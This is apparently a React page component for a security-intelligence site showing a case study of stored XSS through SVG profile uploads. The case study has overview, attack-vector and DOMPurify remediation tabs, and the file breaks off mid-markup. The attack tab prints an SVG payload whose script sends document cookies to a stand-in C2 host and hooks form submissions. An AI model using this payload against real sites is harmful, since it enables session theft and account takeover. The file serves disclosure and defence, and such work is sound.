import { useLocation } from "wouter";
import {
    ChevronLeft,
    Download,
    Share2,
    ShieldCheck,
    Lock,
    Globe,
    Activity,
    Zap,
    FileText,
    Code,
    AlertTriangle,
    Terminal,
    Network,
    ShieldAlert,
    Cpu,
    Fingerprint,
    Search,
    MessageSquare,
    Shield,
    Mail,
    Smartphone,
    CheckCircle2,
    Loader2,
    Users,
    Handshake,
    ArrowUpRight,
    BellRing
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { toast } from "sonner";
import { motion, AnimatePresence } from "framer-motion";
import { useState, useEffect } from "react";
import {
    DropdownMenu,
    DropdownMenuContent,
    DropdownMenuItem,
    DropdownMenuTrigger,
    DropdownMenuLabel,
    DropdownMenuSeparator,
} from "@/components/ui/dropdown-menu";
import {
    Dialog,
    DialogContent,
    DialogHeader,
    DialogTitle,
    DialogDescription,
} from "@/components/ui/dialog";

export default function TechnicalCase() {
    const [, setLocation] = useLocation();
    const [isDownloading, setIsDownloading] = useState(false);
    const [downloadStep, setDownloadStep] = useState(0);
    const [isHandshaking, setIsHandshaking] = useState(false);
    const [handshakeStep, setHandshakeStep] = useState(0);
    const [collaborationStatus, setCollaborationStatus] = useState<"idle" | "awaiting" | "reviewing" | "established">("idle");

    // In a real app, we'd fetch this based on an ID from the URL
    const caseData = {
        title: "Stored XSS in User Profile via SVG Upload",
        id: "TC-882-X9",
        severity: "CRITICAL",
        score: 92,
        author: "ghost_shell",
        publishedAt: "2026-01-30",
        sector: "FINTECH",
        status: "VERIFIED_IMMUTABLE"
    };

    const handleHandshakeStart = () => {
        setIsHandshaking(true);
        setHandshakeStep(1);
    };

    useEffect(() => {
        if (isHandshaking) {
            const timer = setTimeout(() => {
                if (handshakeStep < 4) {
                    setHandshakeStep(prev => prev + 1);
                } else {
                    setIsHandshaking(false);
                    setHandshakeStep(0);
                    setCollaborationStatus("awaiting");

                    toast.success("Enterprise Handshake Transmitted", {
                        description: `Secure intent for Case ${caseData.id} successfully sent. Awaiting researcher acknowledgment.`,
                        icon: <CheckCircle2 className="h-4 w-4 text-primary" />,
                    });

                    // Simulate researcher moving to 'Reviewing' after 1 minute
                    setTimeout(() => {
                        setCollaborationStatus("reviewing");
                        toast.info("Researcher Update", {
                            description: `@${caseData.author} is currently reviewing your collaboration request.`,
                            icon: <Users className="h-4 w-4 text-blue-400" />,
                        });
                    }, 10000);
                }
            }, 1800);
            return () => clearTimeout(timer);
        }
    }, [isHandshaking, handshakeStep]);

    const handleDownloadStart = () => {
        setIsDownloading(true);
        setDownloadStep(1);
    };

    useEffect(() => {
        if (isDownloading) {
            const timer = setTimeout(() => {
                if (downloadStep < 4) {
                    setDownloadStep(prev => prev + 1);
                } else {
                    // Actual file download logic
                    const content = `
H3M4 SECURITY VAULT - TECHNICAL CASE STUDY
------------------------------------------
CASE ID: ${caseData.id}
TITLE: ${caseData.title}
SEVERITY: ${caseData.severity}
THREAT SCORE: ${caseData.score}
AUTHOR: ${caseData.author}
PUBLISHED: ${caseData.publishedAt}
SECTOR: ${caseData.sector}
STATUS: ${caseData.status}

FORENSIC PROVENANCE:
-------------------
CHAIN_SIGNATURE: 0xGH992_XSS_772A_VALID_ECC_384_SIG_01
CONSENSUS: 9/9 NODES VERIFIED

EXECUTIVE SUMMARY:
-----------------
This document confirms a Stored Cross-Site Scripting (XSS) vulnerability 
detected in the SVG parsing engine. The vulnerability allows for 
unauthorized script execution via malformed XML payloads in profile uploads.

MITIGATION STATUS:
-----------------
[REMEDIATED] Applied DOMPurify sanitization and sandbox domain isolation.

DIGITALLY SIGNED BY H3M4 GOVERNANCE NODE.
HASH: SHA256:7b2a758913...
`;
                    const blob = new Blob([content], { type: "text/plain" });
                    const url = window.URL.createObjectURL(blob);
                    const link = document.createElement("a");
                    link.href = url;
                    link.download = `H3M4-Intelligence-${caseData.id}.txt`;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    window.URL.revokeObjectURL(url);

                    setIsDownloading(false);
                    setDownloadStep(0);
                    toast.success("Cryptographically Signed Case Downloaded", {
                        description: `Report ${caseData.id} has been securely archived to your local storage.`,
                    });
                }
            }, 1500);
            return () => clearTimeout(timer);
        }
    }, [isDownloading, downloadStep]);

    const handleShare = (method: string) => {
        toast.promise(new Promise(res => setTimeout(res, 1000)), {
            loading: `Establishing secure handshake with ${method} API...`,
            success: `Case study shared via ${method} encrypted tunnel.`,
            error: "Secure sharing failed",
        });
    };

    return (
        <div className="max-w-6xl mx-auto space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-700 pb-20">
            {/* Header Navigation */}
            <div className="flex items-center justify-between">
                <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => setLocation("/intel")}
                    className="gap-2 text-muted-foreground hover:text-primary transition-colors"
                >
                    <ChevronLeft className="h-4 w-4" /> Back to Intel Feed
                </Button>
                <div className="flex gap-3">
                    <Button
                        variant="outline"
                        size="sm"
                        className="gap-2 border-primary/20 bg-primary/5 hover:bg-primary/10"
                        onClick={handleDownloadStart}
                        disabled={isDownloading}
                    >
                        {isDownloading ? (
                            <Loader2 className="h-4 w-4 animate-spin text-primary" />
                        ) : (
                            <Download className="h-4 w-4" />
                        )}
                        {isDownloading ? "Generating..." : "Download Signed Case"}
                    </Button>

                    <DropdownMenu>
                        <DropdownMenuTrigger asChild>
                            <Button variant="outline" size="sm" className="gap-2 border-primary/20">
                                <Share2 className="h-4 w-4" /> Share Securely
                            </Button>
                        </DropdownMenuTrigger>
                        <DropdownMenuContent className="bg-sidebar/95 backdrop-blur-xl border-white/10 w-56">
                            <DropdownMenuLabel className="text-[10px] uppercase text-muted-foreground">Secure Channel Selection</DropdownMenuLabel>
                            <DropdownMenuSeparator className="bg-white/5" />
                            <DropdownMenuItem className="gap-3 py-2 cursor-pointer focus:bg-primary/10" onClick={() => handleShare("Signal")}>
                                <Smartphone className="h-4 w-4 text-emerald-500" />
                                <div className="flex flex-col">
                                    <span className="text-xs font-bold">Signal Messenger</span>
                                    <span className="text-[9px] text-muted-foreground">E2EE Protocol v3</span>
                                </div>
                            </DropdownMenuItem>
                            <DropdownMenuItem className="gap-3 py-2 cursor-pointer focus:bg-primary/10" onClick={() => handleShare("Secure Vault")}>
                                <Shield className="h-4 w-4 text-primary" />
                                <div className="flex flex-col">
                                    <span className="text-xs font-bold">H3M4 Secure Vault</span>
                                    <span className="text-[9px] text-muted-foreground">Internal Blockchain Storage</span>
                                </div>
                            </DropdownMenuItem>
                            <DropdownMenuItem className="gap-3 py-2 cursor-pointer focus:bg-primary/10" onClick={() => handleShare("PGP Email")}>
                                <Mail className="h-4 w-4 text-orange-500" />
                                <div className="flex flex-col">
                                    <span className="text-xs font-bold">PGP Encrypted Email</span>
                                    <span className="text-[9px] text-muted-foreground">RSA-4096 Multi-sign</span>
                                </div>
                            </DropdownMenuItem>
                            <DropdownMenuItem className="gap-3 py-2 cursor-pointer focus:bg-primary/10" onClick={() => handleShare("Slack (Enterprise)")}>
                                <MessageSquare className="h-4 w-4 text-blue-400" />
                                <div className="flex flex-col">
                                    <span className="text-xs font-bold">Slack Enterprise</span>
                                    <span className="text-[9px] text-muted-foreground">DLP Integrated Channel</span>
                                </div>
                            </DropdownMenuItem>
                        </DropdownMenuContent>
                    </DropdownMenu>
                </div>
            </div>

            {/* Download Progress Dialog */}
            <Dialog open={isDownloading}>
                <DialogContent className="max-w-md bg-sidebar/95 backdrop-blur-2xl border-white/10 p-8 text-center sm:rounded-2xl">
                    <div className="flex flex-col items-center gap-6">
                        <div className="relative h-20 w-20 flex items-center justify-center">
                            <motion.div
                                className="absolute inset-0 rounded-full border-2 border-primary/20 border-t-primary"
                                animate={{ rotate: 360 }}
                                transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                            />
                            <ShieldCheck className="h-10 w-10 text-primary" />
                        </div>

                        <div className="space-y-2">
                            <DialogTitle className="text-xl font-heading font-bold tracking-tight">Securing Intelligence Case</DialogTitle>
                            <DialogDescription className="text-sm text-muted-foreground font-mono">
                                {downloadStep === 1 && "Initializing RSA-4096 Key Exchange..."}
                                {downloadStep === 2 && "Signing forensic block with local validator node..."}
                                {downloadStep === 3 && "Applying tamper-proof watermarks to PDF..."}
                                {downloadStep === 4 && "Finalizing SHA-256 integrity bundle..."}
                            </DialogDescription>
                        </div>

                        <div className="w-full space-y-4">
                            <Progress value={downloadStep * 25} className="h-2" />
                            <div className="flex flex-col gap-2">
                                {[1, 2, 3, 4].map((step) => (
                                    <div key={step} className="flex items-center gap-3 text-left">
                                        {downloadStep > step ? (
                                            <CheckCircle2 className="h-4 w-4 text-emerald-500" />
                                        ) : downloadStep === step ? (
                                            <Loader2 className="h-4 w-4 text-primary animate-spin" />
                                        ) : (
                                            <div className="h-4 w-4 rounded-full border border-white/10" />
                                        )}
                                        <span className={`text-[10px] font-mono whitespace-nowrap ${downloadStep >= step ? "text-foreground" : "text-muted-foreground"}`}>
                                            {step === 1 && "Asymmetric Key Handshake"}
                                            {step === 2 && "Blockchain Hash Anchoring"}
                                            {step === 3 && "PII Data Sanitization"}
                                            {step === 4 && "Immutable Bundle Packaging"}
                                        </span>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </div>
                </DialogContent>
            </Dialog>

            {/* Handshake Progress Dialog */}
            <Dialog open={isHandshaking}>
                <DialogContent className="max-w-md bg-sidebar/95 backdrop-blur-2xl border-white/10 p-8 text-center sm:rounded-2xl shadow-[0_0_50px_rgba(59,130,246,0.2)]">
                    <div className="flex flex-col items-center gap-6">
                        <div className="relative h-20 w-20 flex items-center justify-center">
                            <motion.div
                                className="absolute inset-0 rounded-full border-2 border-blue-500/20 border-t-blue-500"
                                animate={{ rotate: 360 }}
                                transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
                            />
                            <Handshake className="h-10 w-10 text-blue-400" />
                        </div>

                        <div className="space-y-2">
                            <DialogTitle className="text-xl font-heading font-bold tracking-tight text-white">Establishing B2R Handshake</DialogTitle>
                            <DialogDescription className="text-sm text-muted-foreground font-mono">
                                {handshakeStep === 1 && "Routing request through E2EE tunnel..."}
                                {handshakeStep === 2 && "Authenticating enterprise credentials..."}
                                {handshakeStep === 3 && "Broadcasting intent to @ghost_shell..."}
                                {handshakeStep === 4 && "Synchronizing collaboration nodes..."}
                            </DialogDescription>
                        </div>

                        <div className="w-full space-y-4">
                            <Progress value={handshakeStep * 25} className="h-2 bg-blue-500/10" />
                            <div className="flex flex-col gap-2">
                                {[1, 2, 3, 4].map((step) => (
                                    <div key={step} className="flex items-center gap-3 text-left">
                                        {handshakeStep > step ? (
                                            <CheckCircle2 className="h-4 w-4 text-blue-500" />
                                        ) : handshakeStep === step ? (
                                            <Loader2 className="h-4 w-4 text-blue-400 animate-spin" />
                                        ) : (
                                            <div className="h-4 w-4 rounded-full border border-white/10" />
                                        )}
                                        <span className={`text-[10px] font-mono whitespace-nowrap ${handshakeStep >= step ? "text-foreground" : "text-muted-foreground"}`}>
                                            {step === 1 && "Strategic Tunnel Formation"}
                                            {step === 2 && "Identity Verification Layer"}
                                            {step === 3 && "Researcher Node Notification"}
                                            {step === 4 && "Encrypted Channel Setup"}
                                        </span>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </div>
                </DialogContent>
            </Dialog>

            {/* Main Hero Header */}
            <div className="relative p-10 rounded-2xl overflow-hidden border border-white/10 bg-card/30 backdrop-blur-xl">
                <div className="absolute top-0 right-0 p-8 opacity-10 pointer-events-none">
                    <ShieldAlert className="h-40 w-40 text-primary" />
                </div>

                <div className="relative z-10 space-y-6">
                    <div className="flex items-center gap-4">
                        <Badge className="bg-destructive text-white border-destructive text-xs py-1 px-3">CRITICAL SEVERITY</Badge>
                        <span className="font-mono text-[10px] text-muted-foreground tracking-widest uppercase">CASE_ID: {caseData.id}</span>
                    </div>

                    <h1 className="text-4xl md:text-5xl font-heading font-bold text-foreground max-w-3xl leading-tight">
                        {caseData.title}
                    </h1>

                    <div className="flex flex-wrap items-center gap-6 pt-4 text-sm border-t border-white/5 mt-6">
                        <div className="flex items-center gap-2">
                            <div className="h-8 w-8 rounded-full bg-primary/20 flex items-center justify-center border border-primary/30">
                                <span className="text-[10px] font-bold text-primary">GS</span>
                            </div>
                            <div className="flex flex-col">
                                <span className="text-[10px] text-muted-foreground uppercase font-bold">Researcher</span>
                                <span className="font-medium">by {caseData.author}</span>
                            </div>
                        </div>
                        <div className="flex flex-col">
                            <span className="text-[10px] text-muted-foreground uppercase font-bold">Sector Focus</span>
                            <span className="font-medium flex items-center gap-2"><Globe className="h-3 w-3 text-blue-400" /> {caseData.sector}</span>
                        </div>
                        <div className="flex flex-col">
                            <span className="text-[10px] text-muted-foreground uppercase font-bold">Decentralized Status</span>
                            <span className="font-medium text-emerald-500 flex items-center gap-2"><ShieldCheck className="h-3 w-3" /> VERIFIED IMMUTABLE</span>
                        </div>
                        <div className="ml-auto flex items-center gap-4 bg-black/40 p-4 rounded-xl border border-white/5">
                            <div className="text-center px-4 border-r border-white/10">
                                <div className="text-[10px] font-bold text-muted-foreground uppercase mb-1 tracking-tighter">Threat Score</div>
                                <div className="text-2xl font-bold font-mono text-destructive tracking-tighter">{caseData.score}</div>
                            </div>
                            <div className="text-center px-4">
                                <div className="text-[10px] font-bold text-muted-foreground uppercase mb-1 tracking-tighter">Confidence</div>
                                <div className="text-2xl font-bold font-mono text-emerald-500 tracking-tighter">94%</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                {/* Left Column: Deep Dive */}
                <div className="lg:col-span-2 space-y-8">
                    <Tabs defaultValue="overview" className="w-full">
                        <TabsList className="w-full justify-start bg-transparent border-b border-white/10 rounded-none h-auto p-0 mb-6 font-heading">
                            <TabsTrigger value="overview" className="rounded-none border-b-2 border-transparent data-[state=active]:border-primary data-[state=active]:bg-transparent px-6 py-4 text-sm font-bold flex items-center gap-2">
                                <Search className="h-4 w-4" /> Intelligence Summary
                            </TabsTrigger>
                            <TabsTrigger value="attack" className="rounded-none border-b-2 border-transparent data-[state=active]:border-primary data-[state=active]:bg-transparent px-6 py-4 text-sm font-bold flex items-center gap-2">
                                <Zap className="h-4 w-4" /> Attack Vector
                            </TabsTrigger>
                            <TabsTrigger value="mitigation" className="rounded-none border-b-2 border-transparent data-[state=active]:border-primary data-[state=active]:bg-transparent px-6 py-4 text-sm font-bold flex items-center gap-2">
                                <ShieldCheck className="h-4 w-4" /> Remediation Lab
                            </TabsTrigger>
                        </TabsList>

                        <TabsContent value="overview" className="space-y-8 animate-in fade-in duration-500">
                            <div className="space-y-4">
                                <h3 className="text-xl font-bold flex items-center gap-3">
                                    <div className="p-1.5 rounded bg-primary/10"><Activity className="h-5 w-5 text-primary" /></div>
                                    Executive Technical Overview
                                </h3>
                                <p className="text-muted-foreground leading-relaxed">
                                    This critical vulnerability involves a failure in the application's XML/SVG parsing engine. Specifically, when an authenticated user uploads a profile picture in SVG format, the server-side validation correctly checks the file extension but fails to sanitize the underlying XML structure of the SVG for embedded JavaScript.
                                </p>
                                <p className="text-muted-foreground leading-relaxed">
                                    This results in a **Stored Cross-Site Scripting (XSS)** vulnerability. Any user viewing the victim's profile will have the malicious payload executed in their browser context, allowing for session hijacking, CSRF token theft, and unauthorized secondary actions.
                                </p>
                            </div>

                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                <div className="p-6 rounded-xl bg-destructive/5 border border-destructive/10 space-y-3">
                                    <h4 className="text-sm font-bold text-destructive flex items-center gap-2 uppercase tracking-wide">
                                        <AlertTriangle className="h-4 w-4" /> Critical Impact Zone
                                    </h4>
                                    <ul className="space-y-2">
                                        <li className="text-xs text-foreground/80 flex items-start gap-2">
                                            <div className="h-1 w-1 rounded-full bg-destructive mt-1.5 shrink-0" />
                                            Complete compromise of administrative session cookies.
                                        </li>
                                        <li className="text-xs text-foreground/80 flex items-start gap-2">
                                            <div className="h-1 w-1 rounded-full bg-destructive mt-1.5 shrink-0" />
                                            Data exfiltration of sensitive PII during profile rendering.
                                        </li>
                                        <li className="text-xs text-foreground/80 flex items-start gap-2">
                                            <div className="h-1 w-1 rounded-full bg-destructive mt-1.5 shrink-0" />
                                            Widespread account takeover via CSRF exploitation.
                                        </li>
                                    </ul>
                                </div>
                                <div className="p-6 rounded-xl bg-primary/5 border border-primary/10 space-y-3">
                                    <h4 className="text-sm font-bold text-primary flex items-center gap-2 uppercase tracking-wide">
                                        <Lock className="h-4 w-4" /> Security Constraints
                                    </h4>
                                    <ul className="space-y-2">
                                        <li className="text-xs text-foreground/80 flex items-start gap-2">
                                            <div className="h-1 w-1 rounded-full bg-primary mt-1.5 shrink-0" />
                                            WAF bypassed via Base64 encoded CDATA sections.
                                        </li>
                                        <li className="text-xs text-foreground/80 flex items-start gap-2">
                                            <div className="h-1 w-1 rounded-full bg-primary mt-1.5 shrink-0" />
                                            Content-Type sniffing bypass utilized for storage.
                                        </li>
                                        <li className="text-xs text-foreground/80 flex items-start gap-2">
                                            <div className="h-1 w-1 rounded-full bg-primary mt-1.5 shrink-0" />
                                            Bypasses standard `img-src` CSP without careful hardening.
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </TabsContent>

                        <TabsContent value="attack" className="space-y-6 animate-in fade-in duration-500">
                            <div className="rounded-xl border border-white/5 bg-black/40 overflow-hidden">
                                <div className="p-4 bg-white/5 border-b border-white/5 flex items-center justify-between">
                                    <div className="flex items-center gap-2 text-[10px] font-mono font-bold text-muted-foreground uppercase">
                                        <Terminal className="h-4 w-4" /> Attack_Payload_Draft.svg
                                    </div>
                                    <Badge variant="outline" className="text-[9px] border-orange-500/20 text-orange-500">POISONED XML</Badge>
                                </div>
                                <pre className="p-6 font-mono text-xs leading-relaxed text-foreground/90 overflow-x-auto">
                                    {`<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" />
  <script type="text/javascript">
    // Exfiltrate Session Cookies to Remote C2
    fetch('https://c2-infrastructure.red/exfil?data=' + btoa(document.cookie));
    
    // Transparent Hook for Form Hijacking
    document.querySelectorAll('form').forEach(f => {
       f.onsubmit = () => { /* capture sensitive inputs */ };
    });
  </script>
</svg>`}
                                </pre>
                            </div>

                            <div className="p-6 rounded-xl border border-white/5 bg-primary/5 space-y-4">
                                <h4 className="text-sm font-bold flex items-center gap-2">
                                    <Network className="h-4 w-4 text-primary" /> Propagation Flow Simulation
                                </h4>
                                <div className="space-y-6 pt-4">
                                    {[
                                        { step: "Discovery", desc: "Attacker identifies profile upload route /api/v1/user/update_profile." },
                                        { step: "Injection", desc: "Authenticated request sends malicious SVG payload via multipart/form-data." },
                                        { step: "Storage", desc: "Server stores poisoned SVG in S3 bucket without XML sanitization." },
                                        { step: "Execution", desc: "Victim (Admin) views profile -> SVG renders -> Inline script fires in privileged context." },
                                    ].map((s, i) => (
                                        <div key={i} className="flex gap-4 relative">
                                            {i < 3 && <div className="absolute left-4 top-8 bottom-0 w-[1px] bg-primary/20" />}
                                            <div className="h-8 w-8 rounded-full bg-primary/10 border border-primary/20 flex items-center justify-center shrink-0 relative z-10 text-[10px] font-bold text-primary font-mono">
                                                0{i + 1}
                                            </div>
                                            <div className="pt-1">
                                                <div className="text-xs font-bold text-foreground mb-1 font-mono uppercase tracking-widest leading-none">{s.step}</div>
                                                <p className="text-xs text-muted-foreground leading-relaxed">{s.desc}</p>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            </div>
                        </TabsContent>

                        <TabsContent value="mitigation" className="space-y-6 animate-in fade-in duration-500">
                            <div className="p-6 rounded-xl border border-emerald-500/20 bg-emerald-500/5 space-y-2">
                                <h4 className="text-lg font-bold text-emerald-500 flex items-center gap-2">
                                    <ShieldCheck className="h-5 w-5" /> Gold Standard Mitigation Path
                                </h4>
                                <p className="text-sm text-muted-foreground italic">Required implementation for compliance certification.</p>
                            </div>

                            <div className="space-y-4">
                                <div className="rounded-xl border border-white/5 bg-black/60 overflow-hidden">
                                    <div className="p-4 bg-white/5 border-b border-white/5 flex items-center justify-between">
                                        <div className="flex items-center gap-2 text-[10px] font-mono font-bold text-muted-foreground uppercase">
                                            <Code className="h-4 w-4 text-emerald-500" /> Secure_SVG_Handler.js
                                        </div>
                                        <span className="text-[10px] text-emerald-500 font-mono font-bold">REMEDIATED NODE</span>
                                    </div>
                                    <pre className="p-6 font-mono text-xs leading-relaxed text-foreground/90 overflow-x-auto">
                                        {`const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// Sanitize SVG content before storage
async function sanitizeSVG(rawBody) {
    return DOMPurify.sanitize(rawBody, {
        USE_PROFILES: { svg: true },
        // Ensure no scripts are allowed even in data URIs
        FORBID_TAGS: ['script', 'foreignObject'],
        FORBID_ATTR: ['on*', 'href']
    });
}

// Recommended: Proxy SVGs through a separate sandbox domain
// Example: user-content-h3m4.net`}
                                    </pre>
                                </div>

                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                    <div className="p-5 rounded-xl border border-white/10 bg-white/5 space-y-2">
                                        <h5 className="text-xs font-bold uppercase tracking-wider text-primary">Infrastructure Layer</h5>
                                        <p className="text-xs text-muted-foreground leading-relaxed">
                                            Serve all user-uploaded content from a dedicated sandbox domain (e.g., h3m4-static.com) to enforce same-origin policy isolation.
                                        </p>
                                    </div>
                                    <div className="p-5 rounded-xl border border-white/10 bg-white/5 space-y-2">
                                        <h5 className="text-xs font-bold uppercase tracking-wider text-primary">Compliance Control</h5>
                                        <p className="text-xs text-muted-foreground leading-relaxed">
                                            Update CSP to include `script-src 'none'` for image serving endpoints and implement mandatory XML entity expansion limits.
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </TabsContent>
                    </Tabs>

                    {/* MOVED: Collaborate with Researcher Section (Main Column) */}
                    <div className="p-8 rounded-2xl border border-blue-500/30 bg-blue-500/5 space-y-6 relative overflow-hidden border-t-4 border-t-blue-500 shadow-2xl animate-in slide-in-from-bottom-4 duration-1000">
                        <div className="absolute -top-10 -right-10 h-40 w-40 bg-blue-500/10 rounded-full blur-3xl opacity-50" />

                        <div className="flex flex-col md:flex-row gap-8 items-start relative z-10">
                            <div className="flex-1 space-y-4">
                                <Badge className="bg-blue-500/20 text-blue-400 border-blue-500/30 text-[9px] uppercase tracking-widest px-2">Enterprise Engagement</Badge>
                                <h4 className="text-2xl font-bold flex items-center gap-3 text-white">
                                    <Handshake className="h-7 w-7 text-blue-400" /> Collaborate on Solution
                                </h4>
                                <p className="text-sm text-muted-foreground leading-relaxed max-w-xl">
                                    Strategic intelligence requires expert implementation. Connect directly with <span className="text-white font-bold">@{caseData.author}</span> to bridge the gap between discovery and defense. Standardized B2R (Business-to-Researcher) protocols ensure secure, compliant, and efficient professional outcomes.
                                </p>

                                <div className="grid grid-cols-2 gap-4 pt-4">
                                    <div className="flex items-center gap-2 text-xs text-muted-foreground bg-white/5 p-3 rounded-lg border border-white/5">
                                        <Shield className="h-4 w-4 text-emerald-500" /> Compliance Verified
                                    </div>
                                    <div className="flex items-center gap-2 text-xs text-muted-foreground bg-white/5 p-3 rounded-lg border border-white/5">
                                        <Lock className="h-4 w-4 text-primary" /> E2EE Handshake
                                    </div>
                                </div>
                            </div>

                            <div className="w-full md:w-[350px] space-y-4 bg-black/40 p-6 rounded-xl border border-white/5 backdrop-blur-sm">
                                <div className="space-y-1.5">
                                    <label className="text-[10px] font-bold text-muted-foreground uppercase opacity-70">Engagement Objective</label>
                                    <select className="w-full bg-background/50 border border-white/10 rounded-md py-2 px-3 text-sm focus:ring-1 focus:ring-blue-500 transition-all outline-none">
                                        <option>Immediate Patch Implementation</option>
                                        <option>Full System Surface Audit</option>
                                        <option>Long-term Advisory Retainer</option>
                                        <option>Custom Exploit Simulation</option>
                                    </select>
                                </div>

                                <div className="space-y-1.5">
                                    <label className="text-[10px] font-bold text-muted-foreground uppercase opacity-70">Confidential Message</label>
                                    <textarea
                                        placeholder="Ex: We'd like to perform a pilot audit on our SVG parsing cluster..."
                                        className="w-full bg-background/50 border border-white/10 rounded-md py-2 px-3 text-xs min-h-[100px] focus:ring-1 focus:ring-blue-500 transition-all outline-none resize-none"
                                    />
                                </div>

                                <Button
                                    onClick={handleHandshakeStart}
                                    disabled={isHandshaking || collaborationStatus !== "idle"}
                                    className={`w-full font-bold gap-2 group shadow-[0_0_15px_rgba(59,130,246,0.3)] transition-all ${collaborationStatus === "idle" ? "bg-blue-600 hover:bg-blue-500" : "bg-emerald-600/20 text-emerald-400 border border-emerald-500/30"
                                        }`}
                                >
                                    {isHandshaking ? (
                                        <Loader2 className="h-4 w-4 animate-spin" />
                                    ) : collaborationStatus === "idle" ? (
                                        <Users className="h-4 w-4" />
                                    ) : (
                                        <CheckCircle2 className="h-4 w-4" />
                                    )}
                                    {isHandshaking ? "Establishing..." :
                                        collaborationStatus === "idle" ? "INITIATE HANDSHAKE" : "HANDSHAKE TRANSMITTED"}
                                    {collaborationStatus === "idle" && <ArrowUpRight className="h-4 w-4 group-hover:translate-x-0.5 group-hover:-translate-y-0.5 transition-transform" />}
                                </Button>
                            </div>
                        </div>

                        <div className="pt-4 border-t border-white/5 flex items-center justify-between opacity-60 relative z-10">
                            <div className="flex items-center gap-1.5 text-[9px] font-mono">
                                <Shield className="h-3 w-3 text-blue-400" /> SECURE_B2R_PROTOCOL_V2.1
                            </div>
                            <span className="text-[9px] font-mono italic">NETWORK_VERIFIED: 100% SUCCESS RATE</span>
                        </div>
                    </div>
                </div>

                {/* Right Column: Forensic Meta & Ledger */}
                <div className="space-y-6">
                    <div className="p-6 rounded-xl border border-white/10 bg-card/40 backdrop-blur-sm space-y-6">
                        <h3 className="text-sm font-bold uppercase tracking-widest text-muted-foreground border-b border-white/5 pb-3">Forensic Provenance</h3>

                        <div className="space-y-2">
                            <label className="text-[10px] font-bold text-muted-foreground uppercase">Chain Signature</label>
                            <div className="p-3 rounded-lg bg-black/40 border border-white/5 font-mono text-[10px] text-primary break-all">
                                0xGH992_XSS_772A_VALID_ECC_384_SIG_01
                            </div>
                        </div>

                        <div className="space-y-4 pt-2">
                            <div className="flex justify-between items-center text-[10px] uppercase font-bold text-muted-foreground">
                                <span>Verification Consensus</span>
                                <span className="text-emerald-500">9/9 Nodes Verified</span>
                            </div>
                            <div className="flex gap-1">
                                {[1, 2, 3, 4, 5, 6, 7, 8, 9].map(i => <div key={i} className="h-1.5 w-full bg-emerald-500 rounded-full" />)}
                            </div>
                        </div>

                        <div className="space-y-3 pt-4">
                            <div className="flex items-center justify-between p-3 rounded-lg bg-white/5 border border-white/5">
                                <div className="flex items-center gap-2">
                                    <ShieldCheck className="h-3 w-3 text-emerald-500" />
                                    <span className="text-[10px] font-mono">MD5 Checksum</span>
                                </div>
                                <span className="text-[10px] font-mono text-muted-foreground">e10adc...</span>
                            </div>
                            <div className="flex items-center justify-between p-3 rounded-lg bg-white/5 border border-white/5">
                                <div className="flex items-center gap-2">
                                    <ShieldCheck className="h-3 w-3 text-emerald-500" />
                                    <span className="text-[10px] font-mono">Timestamp Anchor</span>
                                    2026-01-30
                                </div>
                                <span className="text-[10px] font-mono text-muted-foreground">EPOCH_173...</span>
                            </div>
                        </div>
                    </div>

                    {/* NEW: Intelligence Pulse & Lifecycle Tracking */}
                    <div className="p-6 rounded-xl border border-white/10 bg-card/40 backdrop-blur-sm space-y-4">
                        <h3 className="text-sm font-bold uppercase tracking-widest text-muted-foreground border-b border-white/5 pb-3 flex justify-between items-center">
                            Case Lifecycle
                            <span className="relative flex h-2 w-2">
                                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75"></span>
                                <span className="relative inline-flex rounded-full h-2 w-2 bg-primary"></span>
                            </span>
                        </h3>

                        <div className="space-y-6 pt-2">
                            <div className="relative space-y-6">
                                {/* Timeline line */}
                                <div className="absolute left-[15px] top-2 bottom-2 w-px bg-white/5" />

                                {[
                                    { label: "Submission", date: "Jan 12", active: true, done: true },
                                    { label: "Vulnerability Verification", date: "Jan 14", active: true, done: true },
                                    { label: "B2R Handshake", date: collaborationStatus === "idle" ? "Pending" : "Jan 30", active: collaborationStatus !== "idle", done: collaborationStatus !== "idle" && collaborationStatus !== "negotiating" },
                                    { label: "Researcher Review", date: collaborationStatus === "reviewing" || collaborationStatus === "established" ? "Active" : "Locked", active: collaborationStatus === "reviewing" || collaborationStatus === "established", done: collaborationStatus === "established" }
                                ].map((step, idx) => (
                                    <div key={idx} className="flex gap-4 items-start relative">
                                        <div className={`h-8 w-8 rounded-full border flex items-center justify-center shrink-0 z-10 transition-colors duration-500 ${step.done ? "bg-emerald-500 border-emerald-500 text-black" :
                                                step.active ? "bg-primary/20 border-primary text-primary animate-pulse" :
                                                    "bg-background border-white/10 text-muted-foreground"
                                            }`}>
                                            {step.done ? <CheckCircle2 className="h-4 w-4" /> : <div className="text-[10px] font-bold">{idx + 1}</div>}
                                        </div>
                                        <div className="pt-1">
                                            <div className={`text-xs font-bold leading-none mb-1 transition-colors ${step.active ? "text-foreground" : "text-muted-foreground"}`}>{step.label}</div>
                                            <div className="text-[10px] text-muted-foreground font-mono uppercase italic">{step.date}</div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>

                        {collaborationStatus !== "idle" && (
